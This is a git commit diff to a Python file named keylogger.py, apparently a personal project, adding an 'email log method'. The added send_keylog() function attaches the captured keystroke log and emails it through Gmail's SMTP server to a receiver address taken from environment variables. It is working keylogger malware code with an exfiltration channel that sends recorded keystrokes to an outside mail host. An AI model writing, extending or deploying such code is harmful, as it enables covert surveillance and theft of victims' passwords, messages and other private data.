131c3b14ba6318fd8e430474b4bb95f180cb2772
manupbx <manveerpbx@gmail.com>
2026-04-16 23:18:41 +0530

    adding email log method

--- keylogger.py
+++ keylogger.py
@@ -5,13 +5,24 @@ import os
 import platform
 import socket
 import threading 
+# file sending libraries
+import smtplib                        # Handles SMTP email connection
+from email.mime.multipart import MIMEMultipart  # Creates email with multiple parts
+from email.mime.base import MIMEBase            # Creates attachment part
+from email.mime.text import MIMEText            # Creates text part
+from email import encoders                      # Encodes attachment to base64
 
 
-# Config
+#---------------------- Config /files----------------------------------#
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-LOG_DIR = os.path.join(SCRIPT_DIR, "logs")
-LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
+LOG_DIR = os.path.join(SCRIPT_DIR, "logs")  # directory for logs
+LOG_FILE = os.path.join(LOG_DIR, "keylog.txt") #log file path 
 os.makedirs(LOG_DIR, exist_ok=True)
+
+#---------------------- Email Config ----------------------------------#
+e_sender = os.getenv("email_sender")  # Sender's email from environment variable
+e_receiver = os.getenv("email_receiver")  # Receiver's email from environment variable
+e_file = LOG_FILE
 
 # Global variables for stopping
 stop_flag = threading.Event()
@@ -82,4 +93,36 @@ def start_keylogger():
 # To activate, call start_keylogger()
 if __name__ == "__main__":
     start_keylogger()
+
+# to send the keylog file. 
+def send_keylog():
+    # create email 
+    msg = MIMEMultipart()
+    msg['From'] = e_sender
+    msg['To'] = e_receiver
+    msg['Subject'] = "Keylog File"
+
+    # attach the file
+    with open(e_file, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(e_file)}")
+    msg.attach(part)
+
+    # ------ --- --- --- email sending - ----- -- - - - -------#
+    try:
+        with smtplib.SMTP(host="smtp.gmail.com", port=587) as server:
+            server.starttls()
+            server.login(e_sender, password = os.getenv("password")) 
+            server.send_message(msg)
+        print("[*] Keylog file sent successfully.")
+    except Exception as e:
+        print(f"[*] Failed to send keylog file: {e}")
+
+# Example usage: call send_keylog() when you want to send the log file
+# send_keylog()
     
+
+
